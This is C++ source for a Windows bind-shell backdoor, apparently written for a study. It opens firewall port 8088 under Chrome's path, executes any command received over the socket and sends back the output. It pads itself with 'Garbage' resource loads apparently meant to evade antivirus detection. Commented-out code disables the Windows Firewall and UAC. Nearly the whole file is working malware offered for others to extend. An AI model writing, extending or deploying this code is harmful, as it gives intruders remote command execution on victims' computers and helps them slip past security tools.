#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <netfw.h>
#include <string>
#include <comutil.h>
#include "resource.h"
#include <atlbase.h> // include the ATL library


//#pragma comment( lib, "netfw.lib" )
#pragma comment(lib, "comsuppw.lib")
#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )
#pragma comment( lib, "fwpuclnt.lib" )
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shell32.lib")

#define BUFSIZE 4096

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "8088"
#define MAX_CMD_LENGTH 1024


/* In comments are different techniques I tested,
 * but were not implemented in the study.
 * There are here since the code was generated  
 * and anyone wanted to try to extend it :).
 */

DWORD WINAPI CmdThread(LPVOID lpParam);

HRESULT WindowsFirewallInitialize(INetFwPolicy2** fwPolicy2) {
    HRESULT hr = S_OK;

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return hr;
    }

    INetFwPolicy2* pNetFwPolicy2 = NULL;
    hr = CoCreateInstance(
        __uuidof(NetFwPolicy2),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2),
        reinterpret_cast<void**>(&pNetFwPolicy2)
    );

    if (FAILED(hr)) {
        CoUninitialize();
        return hr;
    }

    *fwPolicy2 = pNetFwPolicy2;

    CoUninitialize();

    return hr;
}


HRESULT AddFirewallRule(int portNumber)
{
    HRESULT hr = S_OK;

    INetFwPolicy2* fwPolicy = NULL;
    INetFwRules* fwRules = NULL;
    INetFwRule* fwRule = NULL;
    long currentProfilesBitMask = 0;

    // Create a new firewall rule object.
    hr = CoCreateInstance(
        __uuidof(NetFwRule),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwRule),
        reinterpret_cast<void**>(&fwRule)
    );

    if (FAILED(hr)) {
        return hr;
    }

    // Set the protocol and port number.
    fwRule->put_Protocol(NET_FW_IP_PROTOCOL_TCP);
    fwRule->put_LocalPorts(CComBSTR(std::to_wstring(portNumber).c_str()));

    // Set the rule name.
    BSTR bstrRuleName = SysAllocString(L"Allow Port ");
    bstrRuleName = SysAllocStringLen(NULL, wcslen(L"Allow Port ") + 6);
    wcscat_s(bstrRuleName, wcslen(L"Allow Port ") + 6, std::to_wstring(portNumber).c_str());
    fwRule->put_Name(bstrRuleName);

    // Set the application name (optional).
    //fwRule->put_ApplicationName(CComBSTR(L"C:\\Program Files\\MyApp\\MyApp.exe"));
    fwRule->put_ApplicationName(CComBSTR(L"C:\\program files (x86)\\google\\chrome\\application\\chrome.exe"));

    // Get the firewall policy object.
    hr = WindowsFirewallInitialize(&fwPolicy);
    if (FAILED(hr)) {
        if (fwRule != NULL) {
            fwRule->Release();
        }
        return hr;
    }

    // Retrieve the current profile bitmask.
    hr = fwPolicy->get_CurrentProfileTypes(&currentProfilesBitMask);
    if (FAILED(hr)) {
        if (fwRule != NULL) {
            fwRule->Release();
        }
        fwPolicy->Release();
        return hr;
    }

    // Get the Rules object.
    hr = fwPolicy->get_Rules(&fwRules);
    if (FAILED(hr)) {
        if (fwRule != NULL) {
            fwRule->Release();
        }
        fwPolicy->Release();
        return hr;
    }

    // Check if the rule already exists.
    INetFwRule* ruleExists;
    hr = fwRules->Item(bstrRuleName, &ruleExists);
    if (FAILED(hr)) {
        if (fwRule != NULL) {
            fwRule->Release();
        }
        fwRules->Release();
        fwPolicy->Release();
        return hr;
    }

    // Add the rule if it does not exist.
    if (VARIANT_BOOL(ruleExists) != VARIANT_TRUE) {
        fwRule->put_Enabled(VARIANT_TRUE);
        fwRule->put_Action(NET_FW_ACTION_ALLOW);
        hr = fwRules->Add(fwRule);
        if (FAILED(hr)) {
            if (fwRule != NULL) {
                fwRule->Release();
            }
            fwRules->Release();
            fwPolicy->Release();
            return hr;
        }
    }

    // Release the objects.
    if (fwRule != NULL) {
        fwRule->Release();
    }
    if (fwRules != NULL) {
        fwRules->Release();
    }
    if (fwPolicy != NULL) {
        fwPolicy->Release();
    }

    return S_OK;
}


std::string executeCommand(const std::string& command) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

DWORD WINAPI CmdThread(LPVOID lpParam) {
    SOCKET clientSocket = *(SOCKET*)lpParam;
    char recvbuf[MAX_CMD_LENGTH];
    int iResult, iSendResult;
    std::string conn = "Connection established!\n";
    iSendResult = send(clientSocket, conn.c_str(), conn.length(), 0);
    do {
        iResult = recv(clientSocket, recvbuf, MAX_CMD_LENGTH, 0);
        if (iResult > 0) {
            recvbuf[iResult] = '\0';
            std::string result = executeCommand(recvbuf);
            iSendResult = send(clientSocket, result.c_str(), result.length(), 0);
            if (iSendResult == SOCKET_ERROR) {
                closesocket(clientSocket);
                return 1;
            }
        }
        else if (iResult == 0) {
            //printf("Connection closing...\n");
            //Lost connection, no reason to be active
            closesocket(clientSocket);
            return 1;
        }
        else {
            //printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            return 1;
        }
    } while (strcmp(recvbuf, "exit\n") != 0);
    shutdown(clientSocket, SD_SEND);
    closesocket(clientSocket);
    return 0;
}

int WINAPI WinMain(HINSTANCE hRef, HINSTANCE hInstance,
    LPSTR lPstr, int tEst) {
    //Add firewall rule
    AddFirewallRule(int (DEFAULT_PORT));

    // Disable Windows Firewall using PowerShell command
    /*LPCWSTR command = L"powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False";
    SHELLEXECUTEINFO shInfo = { 0 };
    shInfo.cbSize = sizeof(shInfo);
    shInfo.fMask = SEE_MASK_FLAG_NO_UI;
    shInfo.lpVerb = L"runas";
    shInfo.lpFile = L"powershell.exe";
    shInfo.lpParameters = command;
    shInfo.nShow = SW_HIDE;
    if (!ShellExecuteEx(&shInfo))
    {
        DWORD error = GetLastError();
        // handle error
        return error;
    }*/

    //Garbage
    HRSRC resource22 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_21), L"MFUIUKS1_JPG");
    DWORD RSize22 = SizeofResource(NULL, resource22);
    HGLOBAL resouceData22 = LoadResource(NULL, resource22);

    void* e34tregxec21 = VirtualAlloc(0, RSize22, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  
    /*HANDLE hPipe;
    T/CHAR buf[BUFSIZE];
    DWORD dwRead, dwWritten;
    BOOL bSuccess = FALSE;
    TCHAR szCmd[] = L"powershell.exe Set-NetFirewallRule -DisplayName 'Block Port 8081' -Enabled False";*/

    // Disable UAC
    //ShellExecute(NULL, L"runas", L"cmd.exe", L"/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", NULL, SW_SHOW);

    // Open the named pipe
    //hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\MyPipe"), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, BUFSIZE, BUFSIZE, 0, NULL);

    /*if (hPipe == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create named pipe" << std::endl;
        return 1;
    }*/

    // Start the PowerShell process and redirect output to the named pipe
    /*STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = NULL;
    si.hStdOutput = hPipe;
    si.hStdError = hPipe;

    ZeroMemory(&pi, sizeof(pi));

    bSuccess = CreateProcess(NULL, szCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    if (!bSuccess) {
        std::cout << "Failed to start PowerShell process" << std::endl;
        CloseHandle(hPipe);
        return 1;
    }

    // Read output from the named pipe and print to console
    while (ReadFile(hPipe, buf, BUFSIZE - 1, &dwRead, NULL) != FALSE) {
        buf[dwRead] = '\0';
        std::cout << buf << std::endl;
    }

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hPipe);*/

    // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    // Create a listening socket
    struct addrinfo* result = nullptr, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    //Garbage
    HRSRC resource23 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_11), L"MFUIUKS2_JPG");
    DWORD RSize23 = SizeofResource(NULL, resource23);
    HGLOBAL resouceData23 = LoadResource(NULL, resource23);

    void* e34tregxec22 = VirtualAlloc(0, RSize23, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    iResult = getaddrinfo(nullptr, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        //std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    SOCKET listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listenSocket == INVALID_SOCKET) {
        //std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    iResult = bind(listenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        //std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    //Garbage
    HRSRC resource43 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_41), L"MFUIUKS4_JPG");
    DWORD RSize43 = SizeofResource(NULL, resource43);
    HGLOBAL resouceData43 = LoadResource(NULL, resource43);

    void* e34tregxec42 = VirtualAlloc(0, RSize43, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    iResult = listen(listenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        //std::cerr << "Listen failed with error: " << WSAGetLastError() << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    //Garbage
    HRSRC resource24 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_31), L"MFUIUKS3_JPG");
    DWORD RSize24 = SizeofResource(NULL, resource24);
    HGLOBAL resouceData24 = LoadResource(NULL, resource24);

    void* e34tregxec24 = VirtualAlloc(0, RSize24, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Accept incoming connections and start a thread for each client
    while (true) {
        SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            //std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
            closesocket(listenSocket);
            WSACleanup();
            return 1;
        }

        DWORD dwThreadId;
        HANDLE hThread = CreateThread(nullptr, 0, CmdThread, (LPVOID)&clientSocket, 0, &dwThreadId);
        if (hThread == nullptr) {
            //std::cerr << "Error creating thread: " << GetLastError() << std::endl;
            closesocket(clientSocket);
        }
        else {
            CloseHandle(hThread);
        }
    }

    // Cleanup Winsock
    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
